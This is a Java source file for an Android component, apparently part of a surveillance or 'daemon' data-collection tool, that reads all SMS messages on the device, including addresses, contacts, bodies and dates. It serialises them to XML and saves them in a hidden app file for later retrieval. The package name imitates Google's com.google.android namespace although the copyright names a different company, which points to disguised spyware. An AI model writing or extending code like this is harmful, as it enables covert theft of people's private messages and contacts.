/**
 * @(#) MessageCollect.java Created on 2013-1-19
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon.collect;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.UUID;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.google.android.daemon.DateTimeUtil;
import com.google.android.daemon.Util;
import com.google.android.daemon.collect.read.ProviderReader;

/**
 * The class <code>MessageCollect</code>
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public class MessageCollect implements ObjectCollect {

    private static final String TAG = "MessageCollect";

    private Context mContext;

    private MessageReader reader ;

    /**
     * Constructor
     */
    public MessageCollect(Context mContext) {
        this.mContext = mContext;
        reader = new MessageReader(mContext);
    }

    /**
     * {@inheritDoc}
     * 
     * @see com.google.android.daemon.collect.ObjectCollect#collect()
     */
    @Override
    public String collect() {
        return execute();
    }

    /**
     * return save path,is not success return null
     * 
     * @return
     */
    private String execute() {
        final StringBuffer buffer = reader.read();

        final String path = mContext.getFilesDir().getAbsolutePath() + File.separator + UUID.randomUUID();
        final File file = new File(path);
        try {
            final BufferedWriter writer = new BufferedWriter(new FileWriter(file));
            writer.append(buffer);
            writer.flush();
            writer.close();
            return path;
        } catch (IOException e) {
            Log.e(TAG, "", e);
        }
        return null;
    }

    /**
     * 
     * The class <code>MessageRead</code> read message
     * 
     * @author ouyangfeng
     * @version 1.0
     */
    private final class MessageReader extends ProviderReader {

        private static final String SMS_URI_ALL = "content://sms/";

        /**
         * Constructor
         * 
         * @param mContext
         */
        private MessageReader(Context mContext) {
            super(mContext);
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderRead#getProjection()
         */
        @Override
        protected String[] getProjection() {
            return new String[] { "_id", "type", "address", "person", "body", "date" };
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderRead#getUri()
         */
        @Override
        protected Uri getUri() {
            return Uri.parse(SMS_URI_ALL);
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderRead#getRootTag()
         */
        @Override
        protected String getRootTag() {
            return "Conllect";
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderRead#getSortOrder()
         */
        @Override
        protected String getSortOrder() {
            return "date desc";
        }

        /**
         * (non-Javadoc)
         * 
         * @see com.google.android.daemon.collect.read.ProviderRead#readRow(int[], android.database.Cursor)
         */
        @Override
        protected String readRow(int[] columnIndexs, Cursor cur) {
            final int id = cur.getInt(columnIndexs[0]);
            final int type = cur.getInt(columnIndexs[1]);
            final String address = cur.getString(columnIndexs[2]);
            final int person = cur.getInt(columnIndexs[3]);
            final String body = cur.getString(columnIndexs[4]);
            final long date = cur.getLong(columnIndexs[5]);
            
            return smsBuilder(id, type, address, person, body, date);
        }
        
        /**
         * builder one sms
         * 
         * @param id
         * @param type
         * @param address
         * @param person
         * @param body
         * @param date
         * @return
         */
        private String smsBuilder(int id, int type, String address, int person, String body, long date) {

            final StringBuffer buffer = new StringBuffer();
            buffer.append(Util.builderXmlOneTAG("SMS", false, false, true));

            buffer.append(Util.builderXmlTAG("id", "" + id, true));
            buffer.append(Util.builderXmlTAG("type", Util.getSMSType(type), true));
            buffer.append(Util.builderXmlTAG("address", address, true));
            buffer.append(Util.builderXmlTAG("person", "" + person, true));
            buffer.append(Util.builderXmlTAG("body", "<![CDATA[" + body + "]]>", true));
            buffer.append(Util.builderXmlTAG("date", DateTimeUtil.toText2(date), true));

            buffer.append(Util.builderXmlOneTAG("SMS", false, true, true));
            return buffer.toString();
        }

    }

}
